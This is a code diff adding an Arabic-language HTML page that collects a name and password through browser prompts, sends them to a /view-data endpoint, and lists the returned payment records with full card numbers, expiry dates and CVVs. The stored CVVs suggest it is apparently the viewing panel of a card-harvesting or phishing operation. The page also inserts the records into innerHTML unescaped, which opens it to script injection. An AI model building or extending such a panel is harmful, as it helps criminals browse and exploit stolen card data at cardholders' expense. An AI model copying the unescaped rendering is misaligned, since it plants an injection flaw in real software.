@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> المدير الشركة</title>
+    <link rel="stylesheet" href="css/styles.css">
+</head>
+<body>
+    <div class="data-container">
+        <h1>العملاء الشركة </h1>
+        <div id="data-content" class="data-content">
+            
+        </div>
+        <button id="back-button">رجوع  </button>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const userId = prompt(" مرحبا مااسمك الحقيقي");
+            const password = prompt("أدخل كلمة المرور:");
+
+            fetch('/view-data', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ userId, password })
+            })
+            .then(response => {
+                if (response.ok) {
+                    return response.json();
+                } else {
+                    alert('فشل في التحقق');
+                    window.location.href = 'index.html'; // Redirect to form if authentication fails
+                }
+            })
+            .then(data => {
+                const dataContent = document.getElementById('data-content');
+                if (data.length === 0) {
+                    dataContent.innerHTML = '<p>لا توجد بيانات لعرضها.</p>';
+                } else {
+                    let htmlContent = '';
+                    data.forEach(row => {
+                        htmlContent += `<div class="data-item">
+                            <h2>بيانات الدفع</h2>
+                            <div><strong>اسم حامل البطاقة:</strong> ${row.name}</div>
+                            <div><strong>رقم البطاقة:</strong> ${row.card_number}</div>
+                            <div><strong>تاريخ انتهاء البطاقة:</strong> ${row.expiry_date}</div>
+                            <div><strong>CVV:</strong> ${row.cvv}</div>
+                            <div><strong>البلد:</strong> ${row.country}</div>
+                            <div><strong>المبلغ:</strong> ${row.amount}</div>
+                            <div><strong>العملة:</strong> ${row.currency}</div>
+                        </div>`;
+                    });
+                    dataContent.innerHTML = htmlContent;
+                }
+            });
+
+            document.getElementById('back-button').addEventListener('click', () => {
+                window.location.href = 'index.html';
+            });
+        });
+    </script>
+</body>
+</html>
